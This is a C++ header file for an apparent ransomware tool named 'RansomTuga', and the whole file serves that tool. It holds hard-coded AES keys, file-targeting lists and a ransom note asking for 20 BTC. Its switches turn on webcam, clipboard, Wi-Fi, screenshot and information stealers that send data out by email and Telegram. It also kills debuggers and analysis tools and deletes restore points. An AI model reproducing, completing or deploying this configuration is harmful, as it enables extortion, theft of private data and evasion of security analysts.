#pragma once

//global includes
#include "skStr.h"
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/base64.h>

#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


//global variables

/* crypt settings */
#define IV				(string)skCrypt("_bestransistuga")					// constant iv of decrytpion & encryption
#define KEY				(string)skCrypt("ransomtugaISthebesthereactually!")	// constant key of decryption & encryption
#define KEYOFKEY		(string)skCrypt("tugaransomISthebesthereactually!")	// constant key of decryption & encryption of the key in the file
#define CHECK_CONTENT	(string)skCrypt("This is a sample content!!!")		// content of the file used to check the correcy key
#define MAX_THREADS		20													// maximum number of threads used during decryption & encryption
#define MAX_FILE_SIZE	2000000000											// maximum file size in bytes (0 for none)
#define FILE_EXTENSION	(string)skCrypt(".TUGA")							// encrypted files' extension
#define ENCRYPTION_MODE	(string)skCrypt("AdvancedSmartPattern")				// encryption mode (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern, Full/default)
#define HEAD_BYTES		10													// first bytes of the file to be encrypted (for HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
#define STEP_BYTES		10													// bytes step (for DotPattern)
#define PERCENT_BLOCK	75													// percentage of bytes encrypted for each block (for SmartPattern and AdvancedSmartPattern)
#define NUM_BLOCKS		20													// number of equally sized blocks (for AdvancedSmartPattern)

/* files path */
#define DEBUG_FOLDER	(string)skCrypt(".\\debugFolder\\")							// directory where files are encrypted in debug mode if no arguments are provided
#define WEBCAM_PATH		(string)skCrypt("C:\\Windows\\System32\\webcams\\")			// directory where webcams images are stored (and then deleted)
#define WIFI_PATH		(string)skCrypt("C:\\Windows\\System32\\wifies\\")			// directory where wifi files are stored (and then deleted)
#define TEMPFILE		(string)skCrypt("C:\\Windows\\System32\\temp.tmp")			// filepath of the temp file used in some functions
#define CHECKSUM_FILE	(string)skCrypt("C:\\Windows\\System32\\ok.txt")			// filepath of the file used to check the correct key
#define OLDWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\oldWallpaper.jpg")	// filepath of the old wallpaper
#define NEWWALLPAPER	(string)skCrypt("C:\\Windows\\System32\\newWallpaper.jpg")	// filepath of the new wallpaper
#define INFOFILE		(string)skCrypt("C:\\Windows\\System32\\info.txt")			// filepath of the file sended via email with all infos and key
#define EMAILSENDER		(string)skCrypt("C:\\Windows\\System32\\sender.ps1")		// filepath of the email sender
#define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
#define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
#define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program

/* misc settings */
#define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
#define NUMBER_RETRIES		3		// maximum retries for decryptor
#define MAX_PHOTOS			3		// maximum webcam captured

/* enabling features */
#define DEBUG				true	// enable or disable debug mode (print in console)
#define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
#define DROPRUN_TROJAN_FILE	false	// enable or disable droppper & runner of the real program in trojan mode
#define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
#define ANTI_DUMPER			true	// enable or disable anti dumper
#define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
#define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
#define FILE_UPLOADER		false	// enable or disable file uploader
#define TAKE_WEBCAMS		true	// enable or disable webcam stealer
#define STEAL_INFO			true	// enable or disable info stealer
#define GET_CLIPBOARD		true	// enable or disable clipboard grabber
#define GET_WIFI			true	// enable or disable wifi grabber
#define GET_SCREENSHOT		true	// enable or disable screenshot grabber
#define RANDOM_USERAGENT	true	// enable or disable random user agent (if false it uses the first one)
#define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
#define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
#define DROP_README			false	// enable or disable README dropper
#define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
#define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
#define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
#define BACKUP_INFOFILE		true	// enable or disable backup maker in current folder for infoFile in debug mode
#define SEND_EMAIL			true	// enable or disable email sender
#define DEBUG_SEND_EMAIL	false	// enable or disable email sender in debug mode
#define SEND_TGBOT			true	// enable or disable telegram bot sender
#define DEBUG_SEND_TGBOT	false	// enable or disable telegram bot sender in debug mode
#define SEND_CUSTOM_COMMAND false	// enable or disable custom command runner after encrytpion
#define SELFKILL			false	// enable or disable self killer at the end of the program
#define MAX_RETRIES			false	// enable or disable a maximum number of retries for decryptor
#define SELFKILL_RETRIES	false	// enable or disable selfkill after maximum number of retries for decryptor

/* email settings */
#define SENDERMAIL		(string)skCrypt("sender_email@gmail.com")	// sender email
#define SENDERPSW		(string)skCrypt("samplepassword!")			// sender password
#define RECEIVERMAIL	(string)skCrypt("receiver_email@gmail.com")	// receiver email
#define EMAILSUBJECT	(string)skCrypt("RansomTuga infos")			// subject of the email
#define EMAILBODY		(string)skCrypt("These are the infos")		// body of the email

/* telegram settings */
#define BOT_TOKEN	(string)skCrypt("0000000000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")	// telegram bot token
#define CHAT_ID		(string)skCrypt("0000000000")										// telegram chat id (send to @myidbot the command /getid)

/* scheduled task settings */
#define TASKNAME	(string)skCrypt("RansomTuga")	// name of the scheduled task
#define MINUTES		(string)skCrypt("1")			// run task every x minutes	(MUST BE AN INTEGER)


const std::string READMECONTENT = (std::string)skCrypt(
	"You've been hacked\n"
	"Pay me 20BTC and I'll give you the decryption key!\n"
	"Or you will became a potato :C"
); // content of README.txt

const std::string safeFiles[] = {
	(std::string)skCrypt("RansomTuga.exe"),
	(std::string)skCrypt("DataDecryptor.exe"),
	(std::string)skCrypt("InfoDecryptor.exe")
}; // files to not encrypt

const std::string badPrograms[] = {
	(std::string)skCrypt("Taskmgr"),
	(std::string)skCrypt("procexp"),
	(std::string)skCrypt("procexp64"),
	(std::string)skCrypt("procexp64a"),
	(std::string)skCrypt("AnVir"),
	(std::string)skCrypt("anvir64"),
	(std::string)skCrypt("anvirlauncher"),
	(std::string)skCrypt("VirusTotalUpload"),
	(std::string)skCrypt("ProcessHacker"),
	(std::string)skCrypt("dumpcap"),
	(std::string)skCrypt("Wireshark"),
	(std::string)skCrypt("decompile"),
	(std::string)skCrypt("ollydbg"),
	(std::string)skCrypt("tcpview"),
	(std::string)skCrypt("autoruns"),
	(std::string)skCrypt("autorunsc"),
	(std::string)skCrypt("filemon"),
	(std::string)skCrypt("procmon"),
	(std::string)skCrypt("regmon"),
	(std::string)skCrypt("idaq"),
	(std::string)skCrypt("idaq64"),
	(std::string)skCrypt("ImmunityDebugger"),
	(std::string)skCrypt("HookExplorer"),
	(std::string)skCrypt("ImportREC"),
	(std::string)skCrypt("PETools"),
	(std::string)skCrypt("LordPE"),
	(std::string)skCrypt("SysInspector"),
	(std::string)skCrypt("proc_analyzer"),
	(std::string)skCrypt("sysAnalyzer"),
	(std::string)skCrypt("sniff_hit"),
	(std::string)skCrypt("windbg"),
	(std::string)skCrypt("joeboxcontrol"),
	(std::string)skCrypt("joeboxserver"),
	(std::string)skCrypt("ResourceHacker"),
	(std::string)skCrypt("x32dbg"),
	(std::string)skCrypt("x64dbg"),
	(std::string)skCrypt("Fiddler"),
	(std::string)skCrypt("httpdebugger")
}; // tasks to kill

const std::string blacklist[] = {
	(std::string)skCrypt("exe"),
	(std::string)skCrypt("dll"),
	(std::string)skCrypt("ini"),
	(std::string)skCrypt("dat"),
	(std::string)skCrypt("cfg")
}; // extension of files to not encrypt

const std::string whitelist[] = {
	(std::string)skCrypt("jpg"),
	(std::string)skCrypt("jpeg"),
	(std::string)skCrypt("pdf"),
	(std::string)skCrypt("png"),
	(std::string)skCrypt("txt"),
	(std::string)skCrypt("odt"),
	(std::string)skCrypt("xls"),
	(std::string)skCrypt("xlsx"),
	(std::string)skCrypt("ods"),
	(std::string)skCrypt("ppt"),
	(std::string)skCrypt("pptx"),
	(std::string)skCrypt("htm"),
	(std::string)skCrypt("html"),
	(std::string)skCrypt("mp3"),
	(std::string)skCrypt("wma"),
	(std::string)skCrypt("avi"),
	(std::string)skCrypt("mov"),
	(std::string)skCrypt("mp4"),
	(std::string)skCrypt("gif"),
	(std::string)skCrypt("svg"),
	(std::string)skCrypt("ai"),
	(std::string)skCrypt("zip"),
	(std::string)skCrypt("rar"),
	(std::string)skCrypt("7z"),
	(std::string)skCrypt("db"),
	(std::string)skCrypt("bin")
}; // extension of files to encrypt

const std::string userAgents[] = {
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/106.0.1370.52"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"),
	(std::string)skCrypt("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.14"),
	(std::string)skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.72")
};


typedef unsigned char BYTE;

//global functions
std::string aes_decrypt(std::string key, std::string cipher, std::string iv);
std::string aes_encrypt(std::string key, std::string plain, std::string iv);
std::vector<BYTE> base64_decode(const std::string&);
std::string base64_encode(BYTE const* buf, unsigned int bufLen);
